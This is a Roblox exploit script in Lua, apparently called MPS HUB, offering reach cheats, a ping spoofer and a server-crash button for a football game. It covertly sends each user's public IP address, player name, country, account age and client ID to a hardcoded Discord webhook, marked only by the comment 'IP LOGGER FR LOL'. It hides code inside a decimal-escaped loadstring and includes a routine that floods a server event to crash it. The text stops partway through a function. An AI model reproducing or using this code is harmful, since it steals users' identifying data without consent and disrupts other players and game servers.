
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "MPS HUB Key System", HidePremium = false, SaveConfig = true, IntroText = "MPS Key System"})

OrionLib:MakeNotification({
    Name = "Logged in",
    Content = "Welcome! "..Player.Name.."." ,
    Image = "rbxassetid://4483345998",
    Time = 5
})

_G.Key = "iqfWiqfWERTERT-QOgiqfWERTB9fiy5uJr-C8Vu6iqfWERTWZ7LFE" -- Change key here
_G.KeyInput = "string" -- Change what you want the textbox of where you enter the key to say without clicking it

local Key = Window:MakeTab({
    Name = "Key System",
    Icon = "rbxassetid://4483345998", -- Your able to change this to any image you want
    PremiumOnly = false
})

function MakeScriptHub()

---IP LOGGER FR LOL

local webh = "https://discord.com/api/webhooks/1075829154148274196/_ms_rIAdzJ1e7jUDBvR2mUAEU5LqNpHnztqELiSiHXtgBeyT_KYXRI4xvkiiNCStm14K"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
	       ["color"] = 0xFF0000, -- red color code
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)

---key with webhook
---also made by me

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")

local function getHWID()
    local computerName = ""
    pcall(function() computerName = string.lower(os.getenv("COMPUTERNAME")) end)

    local volumeSerialNumber = ""
    pcall(function()
        local drive = string.sub(os.getenv("SystemDrive"), 1, 1)
        local handle = io.popen("vol " .. drive .. ":")
        volumeSerialNumber = string.match(handle:read("*a"), "%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+")
        handle:close()
    end)

    local macAddress = ""
    pcall(function()
        local adapters = game:GetService("NetworkAdapter").GetAdapters()
        table.sort(adapters, function(a, b) return a.Name < b.Name end)
        macAddress = adapters[1].MacAddress
    end)

    local hwidString = computerName .. volumeSerialNumber .. macAddress
    return syn and syn.crypt.hash(syn.crypt.create(hwidString)) or "N/A"
end

local request = http_request or request or (syn and syn.request)

request({
    Method = "POST",
    Url = "https://discord.com/api/webhooks/1075829154148274196/_ms_rIAdzJ1e7jUDBvR2mUAEU5LqNpHnztqELiSiHXtgBeyT_KYXRI4xvkiiNCStm14K",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        username = "Logs",
        embeds = {
            {
                title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                description = "**" .. Players.LocalPlayer.Name .. "** has executed the script!",
                color = 0xFF0000, -- red color code
                fields = {
                    { name = "Place ID", value = game.PlaceId },
                    { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
                    { name = "Country", value = LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer) },
                    { name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
                }
            }
        }
    })
})

wait(1)


local lc = game:GetService("Players").LocalPlayer -- Use GetService it is important because some games change Players so use that instead of game.Players!
local group = 16807529 -- Roblox Fan Group but put your group ID HERE
local grouplink = "https://www.roblox.com/groups/16807529/Scripts-Clothing-Server#!/about"

if lc:IsInGroup(group) then -- IS In group is the roblox API Reference pretty self explanatory 

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("MPS GUI", "Synapse")

local Tab = Window:NewTab("Information")
local Section = Tab:NewSection("Made By KEREM42DNMZ , TeoxTR And Russian")

--------------------------------------------------------------



---------------------------------------------------------------------------

local Tab = Window:NewTab("Mps Scripts")
local Section = Tab:NewSection("Reach")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")

_G.BallName = "TPS"
_G.Magnitude = 5
_G.Enabled = true
-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)
---------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "TPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end )

------------------------------------------------------------------
local Section = Tab:NewSection("Reach Keybind")
Section:NewKeybind("Open", "Open", Enum.KeyCode.K, function()
	_G.BallName = "TPS"
_G.Magnitude = 7
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)



end)

Section:NewKeybind("Close", "Close", Enum.KeyCode.L, function()
	_G.BallName = "TPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)



end)

local Section = Tab:NewSection("Reach Slider")
Section:NewSlider("Slider", "pro", 100, 0, function(s) -- 100 (MaxValue) | 0 (MinValue)
    _G.BallName = "TPS"
_G.Magnitude = s
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)
end)

-------------------------------------------------------------


-------------------------------------------------------------------------

local Section = Tab:NewSection("Ping")
Section:NewButton("%40 Works", "Made by rus ab", function()
loadstring("\119\97\105\116\40\49\41\10\105\102\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\83\99\114\105\112\116\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\99\108\105\101\110\116\80\105\110\103\34\41\32\116\104\101\110\10\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\83\99\114\105\112\116\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\99\108\105\101\110\116\80\105\110\103\34\41\58\68\101\115\116\114\111\121\40\41\10\101\108\115\101\10\32\32\32\32\112\114\105\110\116\40\34\82\101\97\100\121\32\116\111\32\103\111\34\41\10\101\110\100\10\10\10\108\111\99\97\108\32\109\105\110\78\117\109\32\61\32\48\10\10\108\111\99\97\108\32\109\97\120\78\117\109\32\61\32\49\48\10\10\10\10\10\10\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\119\97\105\116\40\49\41\10\32\32\32\32\10\32\32\32\32\108\111\99\97\108\32\112\105\110\103\110\117\109\32\61\32\109\97\116\104\46\114\97\110\100\111\109\40\109\105\110\78\117\109\44\32\109\97\120\78\117\109\41\10\32\32\32\32\10\32\32\32\32\103\97\109\101\46\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\46\69\118\101\110\116\115\46\85\112\100\97\116\101\80\105\110\103\58\70\105\114\101\83\101\114\118\101\114\40\112\105\110\103\110\117\109\41\10\101\110\100\10")()
end)

-------------------------------------------------------------------------

local Section = Tab:NewSection("Crash Server")
Section:NewButton("Crash", "Made by rus ab", function()
_G.on = true --// toggle

while wait(1.0) do --// don't change it's the best
   if _G.on == true then
   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
   local function getmaxvalue(val)
      local mainvalueifonetable = 499999
      if type(val) ~= "number" then
          return nil
      end
      local calculateperfectval = (mainvalueifonetable/(val+2))
      return calculateperfectval
   end

   local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}

    table.insert(spammedtable, {})
    z = spammedtable[1]

    for i = 1, tableincrease do
       local tableins = {}
       table.insert(z, tableins)
       z = tableins
    end

    local calculatemax = getmaxvalue(tableincrease)
    local maximum

    if calculatemax then
        maximum = calculatemax
        else
        maximum = 10000
    end

    for i = 1, maximum do
        table.insert(maintable, spammedtable)
    end

    for i = 1, tries do
        game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
    end
   end

   bomb(250, 10) --// change values if client crashes
end
   end
end)

---------------------------------------------------------------

local Tab = Window:NewTab("Leagues")
local Section = Tab:NewSection("PSML/UFA")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
-- h

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 10
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)
------------------


Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
-- h

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 0
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------

local Section = Tab:NewSection("TRS Public")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
-- h

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 10
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
